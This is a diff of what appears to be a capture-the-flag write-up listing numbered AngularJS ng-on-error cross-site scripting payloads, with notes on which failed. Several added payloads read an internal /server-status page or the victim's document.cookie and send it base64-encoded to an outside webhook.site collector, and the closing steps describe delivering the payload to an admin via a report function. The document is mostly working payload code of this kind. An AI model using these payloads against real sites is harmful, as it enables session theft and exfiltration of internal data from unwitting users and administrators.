@@ -63,31 +63,74 @@ attack - vector:
 ```
 *Success*
 
-**Payload 4:**
+**Payload 3:**
 ```html
 <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.js"></script>
 <div ng-app>
 	<img src=x ng-on-error="
-		webhook = 'https://webhook.site/94c9f31d-eb41-4728-aa5d-f6986d6d5532';
 		window = $event.target.ownerDocument.defaultView;
-		window.fetch('/server-status').then(r => r.text()).then(t => window.location = webhook + '/?data=' + btoa(t));
+		window.fetch('/server-status')
+		.then(r => r.text());
 	">
 </div>
 ```
 *Failed*
 
+**Payload 4:**
 ```html
 <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.js"></script>
 <div ng-app>
 	<img src=x ng-on-error="
-		webhook = 'https://webhook.site/94c9f31d-eb41-4728-aa5d-f6986d6d5532';
 		window = $event.target.ownerDocument.defaultView;
 		window.fetch('/server-status')
-		.then(r => r.text())
-		.then(t => new window.Image().src = webhook + '/?data=' + btoa(t));
+		.then(function(r) { 
+			return r.text();
+		});
+	">
+</div>
+```
+*Failed*
+
+**Payload 5:**
+```html
+<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.js"></script>
+<div ng-app>
+	<img src=x ng-on-error="
+		w = $event.target.ownerDocument.defaultView;
+		xhr = w.Reflect.construct(w.XMLHttpRequest, []);
+		xhr.open('GET', '/server-status', false);
+		xhr.send();
+		w.location = 'https://webhook.site/94c9f31d-eb41-4728-aa5d-f6986d6d5532/?d=' + btoa(xhr.responseText);
 	">
 </div>
 ```
 
+**Payload 6:**
+```html
+<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.js"></script>
+<div ng-app>
+    <img src=x ng-on-error="
+        w = $event.target.ownerDocument.defaultView;
+        xhr = w.Reflect.construct(w.XMLHttpRequest, []);
+        xhr.open('GET', 'http://127.0.0.1/server-status', false);
+        xhr.send();
+        w.location = 'https://webhook.site/94c9f31d-eb41-4728-aa5d-f6986d6d5532/?d=' + w.encodeURIComponent(w.btoa(xhr.responseText));
+    ">
+</div>
+```
+
+**Payload 7:**
+```html
+<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.js"></script>
+<div ng-app>	
+	<img src=x ng-on-error="
+	    w = $event.target.ownerDocument.defaultView;
+	    w.location = 'https://webhook.site/94c9f31d-eb41-4728-aa5d-f6986d6d5532/?c=' + w.encodeURIComponent(w.document.cookie);
+	">
+</div>
+```
+
+**Payload 8:**
 - Send the payload to the admin through report function
+	
 - Fetch the /server-status page 
